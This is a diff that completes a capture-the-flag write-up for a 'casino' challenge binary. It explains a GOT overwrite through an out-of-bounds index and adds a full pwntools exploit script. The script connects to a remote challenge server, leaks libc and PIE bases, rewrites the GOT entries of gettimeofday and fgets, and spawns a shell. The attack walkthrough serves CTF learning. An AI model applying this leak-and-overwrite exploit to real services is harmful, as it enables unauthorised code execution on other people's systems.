@@ -590,4 +590,78 @@ unsigned __int64 replace_card()
 ```
 
 In `replace_card`, same `oob` occurs for same reason as `view_card`, so we can do `got overwrite`. Now, what is the plan?
-At the end of the `main` function, `gettimeofday` called. Overwrite it's got to `main` address to call `main` again. (For `localtime` function, this logic establish exactly same.) Next, overwrite `fgets`' got to system. The reason this works is because we can type `/bin/sh\x00` in the `name` first. So it operate like `syst`
+At the end of the `main` function, `gettimeofday` called. Overwrite it's got to `main` address to call `main` again. (For `localtime` function, this logic establish exactly same.) Next, overwrite `fgets`' got to system. The reason this works is because we can type `/bin/sh\x00` in the `name` first. So it operate like `system('/bin/sh')`. Other register values ​​are not important.
+
+# Exploit
+
+```python
+from pwn import *
+from tqdm import *
+
+context.terminal = ['tmux', 'splitw', '-h']
+
+#p = process('./casino')
+p = remote('20.84.72.194', '5004')
+e = ELF('./casino')
+e2 = ELF('./casino')
+l = ELF('./libc.so.6')
+
+def libc_leak():
+    p.sendlineafter(b': ', b'1')
+    idx = (0x4080 - 0x40e8) * 2
+    libc_base = 0
+    for i in range(12):
+        p.sendlineafter(b': ', b'1')
+        p.sendlineafter(b'? ', str(idx + i).encode())
+        msg = int(p.recvline().split(b'(')[-1].split(b')')[0], 16)
+        libc_base += msg << ((i + 1) * 4 - (i & 1) * 8)
+
+    l.address = libc_base - l.sym['_IO_2_1_stdout_']
+    p.sendlineafter(b': ', b'4')
+    print(hex(l.address))
+
+def pie_leak():
+    p.sendlineafter(b': ', b'1')
+    idx = (0x4070 - 0x40e8) * 2
+    for i in range(12):
+        p.sendlineafter(b': ', b'1')
+        p.sendlineafter(b'? ', str(idx + i).encode())
+        msg = int(p.recvline().split(b'(')[-1].split(b')')[0], 16)
+        e2.address += msg << ((i + 1) * 4 - (i & 1) * 8)
+
+    e2.address -= 0x4070
+    p.sendlineafter(b': ', b'4')
+    print(hex(e2.address))
+
+def got_mod(addr : int, val : int, n : int):
+    idx = (addr - 0x40e8) * 2
+    for i in trange(n):
+        wantvalue = (val & (0xf << ((i + 1) * 4 - (i & 1) * 8))) >> ((i + 1) * 4 - (i & 1) * 8)
+        if wantvalue == 0 : 
+            if i == 1: continue
+            else : exit()
+        msg = 17
+        while msg != wantvalue:
+            p.sendlineafter(b': ', b'1')
+            p.sendlineafter(b': ', b'2')
+            p.sendlineafter(b'? ', str(idx + i).encode())
+            msg = int(p.recvline().split(b'(')[-1].split(b')')[0], 16)
+            p.sendlineafter(b': ', b'4')
+
+p.sendlineafter(b'Enter your name: ', b'/bin/sh\x00')
+libc_leak()
+pie_leak()
+print()
+print(hex(e2.sym['main']))
+print(hex(l.sym['system']))
+got_mod(e.got['gettimeofday'], e2.sym['main'], 4)
+got_mod(e.got['fgets'], l.sym['system'], 6)
+
+# gettimeofday -> main
+# setbuf -> pop r13, ret
+# time -> 0xd4f5f
+
+#gdb.attach(p, "b* main")
+p.sendlineafter(b': ', b'3')
+p.interactive()
+```
